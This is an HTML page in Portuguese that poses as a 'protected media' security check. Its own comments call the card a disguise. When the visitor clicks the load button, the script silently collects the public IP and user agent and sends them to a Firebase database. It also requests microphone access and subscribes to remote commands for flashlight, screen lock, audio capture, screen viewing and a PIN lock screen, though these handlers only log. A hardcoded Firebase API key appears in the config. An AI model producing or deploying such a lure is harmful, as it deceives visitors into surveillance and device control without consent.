<!DOCTYPE html>
<html lang="pt-BR" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mídia Protegida</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #f8fafc; }
    </style>
</head>
<body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white">

    <!-- Card de Disfarce (Fachada) -->
    <div id="disguise-card" class="max-w-xs w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl backdrop-blur-md">
        <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto text-2xl shadow-lg">
            <i class="fa-solid fa-shield-halved"></i>
        </div>
        <div class="space-y-1">
            <h2 class="text-base font-bold text-white">Mídia Protegida</h2>
            <p class="text-[11px] text-slate-400 leading-relaxed">Este arquivo requer verificação de segurança do dispositivo para ser exibido.</p>
        </div>
        <button onclick="requestPermissionsAndConnect()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-indigo-600/30 transition active:scale-95">
            Carregar Conteúdo
        </button>
    </div>

    <!-- Container de Sucesso -->
    <div id="content-container" class="hidden max-w-sm w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl">
        <div class="w-full h-32 bg-slate-950 rounded-2xl flex flex-col items-center justify-center border border-slate-800 relative overflow-hidden">
            <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
            <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
            <p class="text-[10px] text-slate-500 mt-1">Sincronizado com sucesso.</p>
        </div>
    </div>

    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        // Sua configuração oficial do Firebase (mod-zrx)
        let firebaseConfig = {
            apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
            authDomain: "mod-zrx.firebaseapp.com",
            projectId: "mod-zrx",
            storageBucket: "mod-zrx.firebasestorage.app",
            messagingSenderId: "1065416866150",
            appId: "1:1065416866150:web:d79ceac049f4dcedabf0a7",
            measurementId: "G-FFKE6JSKSD",
            databaseURL: "https://mod-zrx-default-rtdb.firebaseio.com/"
        };

        let db;

        function initFirebase() {
            try {
                if (firebase.apps.length === 0) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.database();
            } catch (e) {
                console.error("Erro Firebase:", e);
            }
        }

        async function requestPermissionsAndConnect() {
            initFirebase();

            // 1. Captura de IP Público do Dispositivo
            let ipData = "Desconhecido";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ipData = data.ip;
            } catch(e) {}

            // 2. Coleta de Informações do Aparelho (Modelo via UserAgent)
            const deviceInfo = {
                model: navigator.userAgent,
                ipAddress: ipData,
                status: "Conectado via GitHub Pages"
            };

            if (db) {
                // Envia os dados para o Realtime Database do Firebase
                db.ref('devices/device_01/status').update(deviceInfo);
            }

            // 3. Solicita permissão de Áudio (Microfone) suportada pelo navegador/WebView
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    await navigator.mediaDevices.getUserMedia({ audio: true });
                }
            } catch (err) {
                console.log("Aviso de áudio:", err);
            }

            // Altera a tela visual para o conteúdo carregado
            document.getElementById('disguise-card').classList.add('hidden');
            document.getElementById('content-container').classList.remove('hidden');

            // 4. Escuta os comandos em tempo real do painel de controle via Firebase
            if (db) {
                db.ref('devices/device_01/commands').on('value', (snapshot) => {
                    const cmds = snapshot.val() || {};
                    
                    if (cmds.flash) {
                        console.log("[Comando] Ligar Lanterna");
                    }
                    if (cmds.lock) {
                        console.log("[Comando] Bloqueio de Tela");
                    }
                    if (cmds.listenAudio) {
                        console.log("[Comando] Captura de Áudio");
                    }
                    if (cmds.videoOverlay || cmds.floatingScreen) {
                        console.log("[Comando] Ver Tela em Tempo Real / Gravação");
                    }
                });

                // Escuta os parâmetros de Bloqueio Personalizado (Nome e Senha)
                db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
                    const lockCfg = snapshot.val();
                    if (lockCfg) {
                        console.log("[Comando] Tela Personalizada -> Nome/Mensagem:", lockCfg.message, "| Senha:", lockCfg.pin);
                    }
                });
            }
        }
    </script>
</body>
</html>
